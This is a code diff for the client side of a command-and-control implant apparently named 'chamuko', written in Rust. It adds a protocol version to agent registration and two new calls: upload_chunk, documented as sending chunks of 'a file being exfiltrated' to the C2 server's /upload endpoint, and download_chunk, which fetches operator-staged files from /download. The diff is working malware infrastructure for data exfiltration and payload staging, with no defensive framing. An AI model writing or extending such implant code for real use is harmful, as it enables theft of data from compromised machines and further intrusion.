@@ -1,6 +1,7 @@
 use chamuko_protocol::{
-    AgentInfo, BeaconRequest, BeaconResponse, RegisterRequest, RegisterResponse, ResultsRequest,
-    TaskResult,
+    AgentInfo, BeaconRequest, BeaconResponse, DownloadRequest, DownloadResponse,
+    PROTOCOL_VERSION, RegisterRequest, RegisterResponse, ResultsRequest, TaskResult,
+    UploadRequest, UploadResponse,
 };
 
 #[derive(Debug)]
@@ -84,6 +85,7 @@ impl C2Client {
                 agent: info.clone(),
                 sleep: Some(sleep),
                 jitter: Some(jitter),
+                protocol: PROTOCOL_VERSION,
             },
         )?;
         Self::parse(resp)
@@ -95,6 +97,40 @@ impl C2Client {
             &BeaconRequest {
                 id: id.to_string(),
                 timestamp: chamuko_protocol::now_secs(),
+            },
+        )?;
+        Self::parse(resp)
+    }
+
+    /// Sends one chunk of a file being exfiltrated.
+    pub fn upload_chunk(
+        &self,
+        id: &str,
+        name: &str,
+        chunk: chamuko_protocol::Chunk,
+    ) -> Result<UploadResponse, C2Error> {
+        let resp = self.post(
+            "/upload",
+            &UploadRequest {
+                id: id.to_string(),
+                name: name.to_string(),
+                chunk,
+            },
+        )?;
+        Self::parse(resp)
+    }
+
+    /// Fetches one chunk of a file the operator staged.
+    pub fn download_chunk(
+        &self,
+        transfer: &str,
+        index: u32,
+    ) -> Result<DownloadResponse, C2Error> {
+        let resp = self.post(
+            "/download",
+            &DownloadRequest {
+                transfer: transfer.to_string(),
+                index,
             },
         )?;
         Self::parse(resp)
